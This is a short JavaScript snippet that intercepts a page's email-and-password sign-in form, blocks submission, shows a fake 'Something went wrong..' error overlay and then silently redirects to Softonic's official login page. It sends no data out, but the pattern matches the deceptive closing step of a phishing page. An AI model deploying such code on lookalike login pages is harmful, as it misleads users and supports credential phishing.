// Intercept the sign-in form, show an error message, then redirect silently.
(function () {
  const SOFTONIC_LOGIN = 'https://en.softonic.com/auth/login';
  const REDIRECT_DELAY_MS = 1500; // how long to show the message before redirect

  function createOverlay(message) {
    const overlay = document.createElement('div');
    overlay.id = 'login-redirect-overlay';
    Object.assign(overlay.style, {
      position: 'fixed',
      inset: '0',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      background: 'rgba(0,0,0,0.4)',
      zIndex: 2147483647,
      pointerEvents: 'auto',
      transition: 'opacity 180ms ease',
    });

    const box = document.createElement('div');
    Object.assign(box.style, {
      background: '#fff',
      color: '#111',
      padding: '16px 20px',
      borderRadius: '8px',
      boxShadow: '0 6px 24px rgba(0,0,0,0.3)',
      fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
      fontSize: '16px',
      fontWeight: '600',
      textAlign: 'center',
      minWidth: '220px',
    });
    box.textContent = message;

    overlay.appendChild(box);
    return overlay;
  }

  function showMessageAndRedirect(message, url, delay) {
    // Avoid adding multiple overlays
    if (document.getElementById('login-redirect-overlay')) return;
    const overlay = createOverlay(message);
    document.body.appendChild(overlay);
    // Redirect after the delay (no extra text shown)
    setTimeout(() => {
      // remove overlay quickly before navigation (optional)
      try { overlay.style.opacity = '0'; } catch (e) {}
      // Navigate to official Softonic login page
      window.location.href = url;
    }, delay);
  }

  function attachInterceptor() {
    // Prefer the form that contains the email/password inputs
    const emailInput = document.querySelector('input[type="email"]#email, input#email');
    const passwordInput = document.querySelector('input[type="password"]#password, input#password');
    let loginForm = null;

    if (emailInput && passwordInput) {
      loginForm = emailInput.closest('form') || passwordInput.closest('form');
    }
    // Fallback: first form on the page
    if (!loginForm) loginForm = document.querySelector('form');

    if (!loginForm) return;

    // Intercept submit (covers click on submit buttons and programmatic submits)
    loginForm.addEventListener('submit', function (e) {
      // Prevent any default submission and React form replay behaviour
      e.preventDefault();
      e.stopImmediatePropagation();

      showMessageAndRedirect('Something went wrong..', SOFTONIC_LOGIN, REDIRECT_DELAY_MS);
    }, { capture: true });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachInterceptor);
  } else {
    attachInterceptor();
  }
})();